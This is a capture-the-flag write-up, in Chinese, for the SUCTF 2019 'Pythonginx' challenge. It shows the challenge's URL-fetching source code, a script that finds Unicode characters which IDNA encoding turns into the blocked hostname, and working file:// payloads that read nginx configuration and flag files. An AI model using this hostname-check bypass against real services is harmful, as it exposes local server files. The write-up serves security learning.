* # SUCTF 2019

* ## 0x01 Pythonginx

  关键词：nginx架构，编码与解码，python

进入界面，读取源码：

```
@app.route('/getUrl', methods=['GET', 'POST']) 
def getUrl(): 
    url = request.args.get("url") 
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111" 
    parts = list(urlsplit(url))
    host = parts[1] 
    if host == 'suctf.cc': 
        return "我扌 your problem? 222 " + host
    newhost = [] 
    for h in host.split('.'): 
        newhost.append(h.encode('idna').decode('utf-8')) 
        parts[1] = '.'.join(newhost) 
        #去掉 url 中的空格 
    finalUrl = urlunsplit(parts).split(' ')[0] 
    host = parse.urlparse(finalUrl).hostname 
    if host == 'suctf.cc': 
        return urllib.request.urlopen(finalUrl).read() 
    else: 
        return "我扌 your problem? 333"
```

源码基本逻辑为：

* 第一次主机地址不能为suctf.cc
* 第二次主机地址不能为suctf.cc
* 最后一次主机地址（经过idna编码和utf-8解码后）为suctf.cc后打开网址对应的网站并读取源码

故我们可以采用这个逻辑去进行编码，编码脚本如下：

```
for i in range(128,65537):    
    tmp=chr(i)    
    try:        
        res = tmp.encode('idna').decode('utf-8')        
        if("-") in res:            
            continue        
        print("U:{}    A:{}      ascii:{} ".format(tmp, res, i))    
    except:        
        pass
```

人工寻找能够在编码解码后替换网址的字符完成绕过

第一步payload：

```
file://suctf.cＣ
```

进入nginx文件读取环节，需要掌握基础知识如下：

* Nginx 重要文件目录

  配置文件存放目录：/etc/nginx
  主要配置文件：/etc/nginx/conf/nginx.conf
  管理脚本：/usr/lib64/systemd/system/nginx.service
  模块：/usr/lisb64/nginx/modules
  应用程序：/usr/sbin/nginx
  程序默认存放位置：/usr/share/nginx/html
  日志默认存放位置：/var/log/nginx
  Nginx配置文件：/usr/local/nginx/conf/nginx.conf
  
* 最终在nginx配置文件中找到flag位置

```
file://suctf.cＣ/usr/local/nginx/conf/nginx.conf
```

![su1](https://raw.githubusercontent.com/Heart-1ess/Heart_1ess-s-CTF-Note/master/assets/su1.png)

最终payload：

```
file://suctf.cＣ/usr/fffffflag
```

